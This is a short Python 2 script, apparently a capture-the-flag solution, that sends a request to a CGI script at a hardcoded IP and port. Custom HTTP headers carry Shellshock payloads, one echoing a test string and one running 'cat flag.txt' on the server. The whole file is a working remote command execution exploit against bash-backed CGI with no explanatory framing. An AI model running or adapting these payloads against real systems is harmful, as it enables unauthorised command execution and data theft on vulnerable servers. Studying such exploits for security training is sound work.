#coding=utf-8
import urllib, urllib2
import cookielib, socket
import cgi, re, os

def get_request(url):
    socket.setdefaulttimeout(5)
    i_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
                 "CustomHeader": "() { test;};echo; echo shellshock one;",
                 "CustomHeaderNew": "() { _;} >shellshockme[$($())] { cat flag.txt;}",
                 }

    try:
        req = urllib2.Request(url, headers=i_headers)
        response = urllib2.urlopen(req)
        print response.info()
        html = response.read()
        print html
    except:
        print "Error on request"

if __name__ == '__main__':
    url = "http://218.2.197.232:28647/cgi-bin/test.sh"
    get_request(url)